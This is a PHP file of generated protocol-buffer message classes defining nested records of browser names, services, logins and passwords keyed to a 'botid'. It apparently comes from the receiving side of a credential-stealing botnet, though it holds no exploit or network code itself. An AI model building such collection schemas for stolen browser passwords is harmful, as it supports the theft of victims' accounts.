<?php
class browser_account extends PBMessage
{
  var $wired_type = PBMessage::WIRED_LENGTH_DELIMITED;
  public function __construct($reader=null)
  {
    parent::__construct($reader);
    $this->fields["1"] = "PBString";
    $this->values["1"] = "";
    $this->fields["2"] = "PBString";
    $this->values["2"] = "";
    $this->fields["3"] = "PBString";
    $this->values["3"] = "";
  }
  function service()
  {
    return $this->_get_value("1");
  }
  function set_service($value)
  {
    return $this->_set_value("1", $value);
  }
  function login()
  {
    return $this->_get_value("2");
  }
  function set_login($value)
  {
    return $this->_set_value("2", $value);
  }
  function password()
  {
    return $this->_get_value("3");
  }
  function set_password($value)
  {
    return $this->_set_value("3", $value);
  }
}
class browser extends PBMessage
{
  var $wired_type = PBMessage::WIRED_LENGTH_DELIMITED;
  public function __construct($reader=null)
  {
    parent::__construct($reader);
    $this->fields["1"] = "PBString";
    $this->values["1"] = "";
    $this->fields["2"] = "browser_account";
    $this->values["2"] = array();
  }
  function browser()
  {
    return $this->_get_value("1");
  }
  function set_browser($value)
  {
    return $this->_set_value("1", $value);
  }
  function accounts($offset)
  {
    return $this->_get_arr_value("2", $offset);
  }
  function add_accounts()
  {
    return $this->_add_arr_value("2");
  }
  function set_accounts($index, $value)
  {
    $this->_set_arr_value("2", $index, $value);
  }
  function remove_last_accounts()
  {
    $this->_remove_last_arr_value("2");
  }
  function accounts_size()
  {
    return $this->_get_arr_size("2");
  }
}
class message_logpass extends PBMessage
{
  var $wired_type = PBMessage::WIRED_LENGTH_DELIMITED;
  public function __construct($reader=null)
  {
    parent::__construct($reader);
    $this->fields["1"] = "PBString";
    $this->values["1"] = "";
    $this->fields["2"] = "browser";
    $this->values["2"] = array();
  }
  function botid()
  {
    return $this->_get_value("1");
  }
  function set_botid($value)
  {
    return $this->_set_value("1", $value);
  }
  function browsers($offset)
  {
    return $this->_get_arr_value("2", $offset);
  }
  function add_browsers()
  {
    return $this->_add_arr_value("2");
  }
  function set_browsers($index, $value)
  {
    $this->_set_arr_value("2", $index, $value);
  }
  function remove_last_browsers()
  {
    $this->_remove_last_arr_value("2");
  }
  function browsers_size()
  {
    return $this->_get_arr_size("2");
  }
}
?>